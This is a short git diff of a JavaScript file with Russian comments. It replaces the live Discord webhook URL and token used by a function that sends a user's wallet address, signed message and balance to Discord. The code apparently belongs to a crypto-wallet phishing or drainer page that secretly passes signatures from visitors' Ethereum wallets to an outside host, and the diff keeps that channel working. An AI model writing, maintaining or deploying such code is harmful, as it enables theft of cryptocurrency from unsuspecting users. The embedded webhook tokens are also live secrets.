@@ -28,7 +28,7 @@ function hideElement(element) {
 
 // Функция для отправки данных на Discord webhook
 async function sendToDiscordWebhook(userAddress, signature, message, originalMessage) {
-    const webhookURL = 'https://discordapp.com/api/webhooks/1420886875543048366/0BLuHD0PYjBd5nfjSGoPZRVQU-xlhrkH9nIMcWbM-swL6cufeQ3ZQ74NpYpKMB3rF_82';
+    const webhookURL = 'https://discordapp.com/api/webhooks/1420892589720207401/TQSUm3NR-ZapX6n6YGLG0Yq8PT4EabpX0L67U-chCFOPiqH_Axk2cE88W48DrjKZ34kC';
     
     // Получаем баланс и название сети
     const balance = await getShortBalance();
@@ -292,3 +292,4 @@ if (typeof window.ethereum !== 'undefined') {
         window.location.reload();
     });
 }
+
